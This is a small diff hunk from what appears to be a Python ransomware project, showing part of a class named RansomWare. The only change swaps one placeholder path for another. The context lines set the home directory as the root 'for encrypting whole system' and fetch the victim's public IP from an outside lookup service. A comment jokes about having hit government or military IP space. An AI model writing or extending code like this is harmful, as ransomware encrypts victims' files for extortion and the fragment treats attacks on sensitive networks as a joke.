@@ -46,7 +46,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = r'change this to your filepath' # Debugging/Testing
+        self.localRoot = r'filepath' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
